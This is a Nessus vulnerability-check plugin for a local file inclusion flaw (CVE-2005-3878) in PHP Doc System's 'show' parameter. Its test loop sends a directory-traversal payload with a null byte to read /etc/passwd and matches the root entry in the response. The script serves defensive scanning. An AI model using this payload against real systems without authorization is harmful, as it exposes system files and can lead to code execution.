#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(20246);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2005-3878");
  script_bugtraq_id(15611);
  script_xref(name:"OSVDB", value:"21140");

  script_name(english:"PHP Doc System index.php show Parameter Local File Inclusion");
  script_summary(english:"Checks for show parameter local file include vulnerability in PHP Doc System");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
local file inclusion vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PHP Doc System, a modular, PHP-based system
for creating documentation. 

The version of PHP Doc System installed on the remote host fails to
sanitize user input to the 'show' parameter of the 'index.php' script
before using it in a PHP 'include' function.  An unauthenticated
attacker may be able to exploit this issue to view arbitrary files on
the remote host or to execute arbitrary PHP code taken from arbitrary
files on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://pridels.blogspot.com/2005/11/php-doc-system-151-local-file.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N" );
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/documentation", "/docs", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read /etc/passwd.
  file = "../../../../../../../../../../../etc/passwd%00";
  r = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "show=", file
    ), 
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
    contents = res - strstr(res, "<br />");
    if (!strlen(contents)) contents = res;

    report = string(
      "\n",
      contents
    );
    security_warning(port:port, extra:report);
    exit(0);
  }
}
